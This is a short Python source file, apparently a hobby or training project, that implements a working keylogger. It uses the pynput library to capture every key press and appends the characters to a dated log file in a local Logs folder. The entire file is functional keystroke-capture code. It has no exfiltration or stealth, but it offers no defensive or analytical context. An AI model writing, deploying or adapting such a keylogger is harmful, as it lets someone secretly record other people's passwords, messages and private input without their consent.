from pynput import keyboard
import datetime
import os

try:
    os.mkdir('./Logs')
except:
    pass
class KeyLogger():
    timeStamp = str(datetime.date.today()).replace('-','')
    def __init__(self, NomeDoArquivo: str = './Logs/'+timeStamp+'.txt') -> None:
        self.NomeDoArquivo = NomeDoArquivo

    @staticmethod
    def get_char(Tecla):
        try:
            return Tecla.char
        except AttributeError:
            if str(Tecla) == 'Key.space':
                Tecla = str(Tecla).replace('Key.space',' ')
            if str(Tecla) == 'Key.enter':
                Tecla = str(Tecla).replace('Key.enter','\n')
            return str(Tecla)

    def on_press(self, Tecla):
        with open(self.NomeDoArquivo, 'a') as logs:
            logs.write(self.get_char(Tecla))

    def main(self):
        escuta = keyboard.Listener(
            on_press=self.on_press,
        )
        escuta.start()

if __name__ == '__main__':
    logger = KeyLogger()
    logger.main()
    input()